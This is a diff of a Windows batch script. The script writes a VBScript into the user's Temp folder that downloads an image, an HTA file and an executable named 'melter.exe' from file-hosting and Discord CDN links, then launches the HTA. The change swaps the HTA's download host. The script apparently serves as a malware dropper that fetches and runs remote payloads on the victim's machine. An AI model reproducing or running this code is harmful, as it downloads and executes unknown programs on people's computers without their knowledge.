@@ -42,7 +42,7 @@ cd %systemdrive%\Users\%USERNAME%\AppData\Local\Temp
 @echo voila = wshell.ExpandEnvironmentStrings("%SYSTEMDRIVE%")>>%lol%.vbs
 @echo. >>%lol%.vbs
 (echo HTTPDownload "https://image.noelshack.com/fichiers/2022/48/3/1669809091-risitas.jpeg", "" ^& voila ^& "\Users\" ^& strUserName ^& "\AppData\Local\Temp")>>%lol%.vbs
-(echo HTTPDownload "https://files.catbox.moe/qoebp8.hta", "" ^& voila ^& "\Users\" ^& strUserName ^& "\AppData\Local\Temp")>>%lol%.vbs
+(echo HTTPDownload "https://cdn.discordapp.com/attachments/1025871796798500925/1047554447863189624/risitas.hta", "" ^& voila ^& "\Users\" ^& strUserName ^& "\AppData\Local\Temp")>>%lol%.vbs
 (echo HTTPDownload "https://ddl8.data.hu/get/339969/12880996/melter.exe", "" ^& voila ^& "\Users\" ^& strUserName ^& "\AppData\Local\Temp")>>%lol%.vbs
 @echo. >>%lol%.vbs
 @echo Sub HTTPDownload( myURL, myPath )>>%lol%.vbs
@@ -273,8 +273,8 @@ if exist %led%.vbs (
 )
 
 :tgjuif
-if exist qoebp8.hta (
-	start qoebp8.hta
+if exist risitas.hta (
+	start risitas.hta
 	goto pourlefdc
 ) ELSE (
 	tgjuif
